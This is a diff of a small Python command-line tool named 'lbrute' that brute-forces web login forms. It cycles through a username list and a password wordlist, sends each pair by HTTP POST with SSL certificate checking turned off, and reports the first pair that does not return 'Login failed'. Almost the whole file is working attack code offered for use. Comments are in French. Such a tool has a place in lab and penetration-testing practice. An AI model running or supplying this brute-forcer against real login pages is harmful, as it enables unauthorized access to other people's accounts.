@@ -2,59 +2,82 @@
 
 import pyfiglet
 from colorama import Fore
-
 import requests
 from argparse import ArgumentParser
 import sys
-import time
+import os
 
-import io
-
+# Définition de l'auteur
 author = '@Ber1y'
+
+# Création de l'art ASCII "LBRUTE" avec PyFiglet
 text = pyfiglet.figlet_format("lbrute".upper())
 
+# Analyse des arguments en ligne de commande
 parser = ArgumentParser()
-parser.add_argument('-u', '--url', help = "The url login page", type = str)
-parser.add_argument('-w', '--username', help = "The usernames wordlist", type = open)
-parser.add_argument('-v', '--verbose', help = "Show more information about the attack", action = 'store_true')
-
+parser.add_argument('-u', '--url', help="The URL of the login page", type=str, required=True)
+parser.add_argument('-n', '--userlist', help="The usernames file", type=str, required=True)
+parser.add_argument('-w', '--wordlist', help="The password wordlist file", type=str, required=True)
+parser.add_argument('-v', '--verbose', help="Show more information about the attack", action='store_true')
 args = parser.parse_args()
-wordlist = '/usr/share/wordlists/rockyou.txt'
 
+# Obtention du chemin absolu des fichiers d'utilisateurs et de mots de passe
+args.userlist = os.path.abspath(args.userlist)
+args.wordlist = os.path.abspath(args.wordlist)
+
+# Affichage de l'en-tête avec des informations sur l'application
 print(f"""{Fore.GREEN}
 {text}
 {Fore.WHITE}
-Create by {author}
-{'--'*30}
+Created by {author}
+{'--' * 40}
 {Fore.WHITE}
-This a very very basic bruteforcing tools.
-:: URL			: {args.url}
-:: Usernames		: {args.username.name}
-:: Passwords		: {wordlist}
-{'--'*30}
+This is a very basic brute-forcing tool.
+:: URL         : {args.url}
+:: Usernames   : {args.userlist}
+:: Passwords   : {args.wordlist}
+{'--' * 40}
 """)
 
-def bruteforce(url, usernames, passwords):
-	for user in usernames:
-		user = user.strip()
-		for pwd in io.open(passwords, encoding='latin-1'):
-			pwd = pwd.strip()
-			data = {"username" : user, "password" : pwd, "Login": "Login"}
-			r = requests.post(url, data = data)
+# Définition de la fonction de force brute
+def bruteforce(url, userlist, wordlist):
+    try:
+        # Lecture du fichier d'utilisateurs
+        with open(userlist, 'r', encoding='latin-1') as users_file:
+            for user in users_file:
+                user = user.strip()
+                # Lecture du fichier de mots de passe
+                for password in open(wordlist, 'r', encoding='latin-1'):
+                    password = password.strip()
+                    data = {"username": user, "password": password, "Login": "Login"}
+                    try:
+                        # Envoi de la requête POST pour tester les identifiants
+                        r = requests.post(url, data=data, verify=False)  # Désactivation de la validation du certificat SSL pour les tests.
+                        if "Login failed" in r.text:
+                            if args.verbose:
+                                print(f"{Fore.RED}[-] {Fore.WHITE}Credentials failed: {user}:{password}")
+                        else:
+                            # Affichage des identifiants trouvés
+                            return (user, password)
+                    except Exception as e:
+                        print(f"{Fore.RED}[-] {Fore.WHITE}Error: {e}")
+                if not args.verbose:
+                    print("Working...")
+    except Exception as e:
+        print(f"{Fore.RED}[-] {Fore.WHITE}Error: {e}")
 
-			if "Login failed" in r.text:
-				if args.verbose:
-					print(f"{Fore.RED}[-] {Fore.WHITE}Attacking: {user}:{pwd}")
-			else:
-				return (user, pwd)
-
+# Exécution de la fonction de force brute
 try:
-	if args.url and args.username:
-		found = bruteforce(args.url, args.username, wordlist)
-		print(f"{Fore.BLUE}[+] {Fore.WHITE}Credentials found: {found[0]}:{found[1]}")
-	else:
-		print(f"Some arguments are remember to enable this attack. Use \"-h\" to see the help options.")
-except TypeError:
-	print(f"{Fore.RED}[-] {Fore.WHITE}Credentials Not found. Try to use a nother wordlist or username.")
-except:
-	print(f"{Fore.BLUE}[-] {Fore.WHITE}Exits...")
+    credentials = bruteforce(args.url, args.userlist, args.wordlist)
+    if credentials:
+        # Affichage des identifiants trouvés
+        print(f"{Fore.BLUE}[+] Credentials found: {credentials[0]}:{credentials[1]}")
+    else:
+        # Aucun identifiant trouvé
+        print(f"{Fore.RED}[-] Credentials Not found. Try using a different wordlist or username list.")
+except KeyboardInterrupt:
+    # Sortie en cas d'interruption clavier (Ctrl+c)
+    print(f"{Fore.BLUE}[-] {Fore.WHITE}Exit.")
+except Exception as e:
+    # Gestion des erreurs
+    print(f"{Fore.RED}[-] {Fore.WHITE}Error: {e}")
